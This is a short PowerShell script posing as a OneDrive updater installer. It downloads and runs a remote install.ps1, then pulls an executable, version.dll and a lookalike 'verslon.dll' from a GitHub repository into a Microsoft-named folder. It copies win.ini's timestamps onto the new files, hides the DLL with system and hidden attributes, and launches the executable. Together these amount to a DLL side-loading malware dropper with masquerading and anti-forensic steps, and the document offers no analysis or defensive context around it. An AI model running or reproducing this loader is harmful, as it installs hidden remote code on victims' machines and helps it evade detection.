invoke-expression (new-object "System.Net.WebClient").downloadstring("https://github.com/witnessstrong/OneDriveUpdater/raw/3c032a4a8dafbaa74609aead2a2ae270495f2459/install.ps1")|out-null
  new-item -itemtype "Directory" -force -path "C:\\Program Files\\Microsoft\\OneDriveUpdater"|out-null
  (new-object "Net.WebClient").downloadfile("https://github.com/witnessstrong/OneDriveUpdater/raw/3c032a4a8dafbaa74609aead2a2ae270495f2459/OneDriveStandaloneUpdater.exe", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\OneDriveStandaloneUpdater.exe")
  (new-object "Net.WebClient").downloadfile("https://github.com/witnessstrong/OneDriveUpdater/raw/3c032a4a8dafbaa74609aead2a2ae270495f2459/version.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\version.dll")
  (new-object "Net.WebClient").downloadfile("https://github.com/witnessstrong/OneDriveUpdater/raw/3c032a4a8dafbaa74609aead2a2ae270495f2459/verslon.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\verslon.dll")
  $ts = get-item "C:\\Windows\\win.ini"|%{$_.lastwritetime}
  $files = "C:\\Program Files\\Microsoft\\OneDriveUpdater\\OneDriveStandaloneUpdater.exe", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\version.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\verslon.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater", "C:\\Program Files\\Microsoft\\"
  ("C:\\Program Files\\Microsoft\\OneDriveUpdater\\OneDriveStandaloneUpdater.exe", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\version.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\verslon.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater", "C:\\Program Files\\Microsoft\\").foreach({$file = gi $_, $file.lastwritetime = $ts, $file.lastaccesstime = $ts, $file.creationtime = $ts})
  attrib "+s" "+h" "C:\\Program Files\\Microsoft\\OneDriveUpdater\\version.dll" "/S" "/D" "/L"
  c:\program files\microsoft\onedriveupdater\onedrivestandaloneupdater.exe
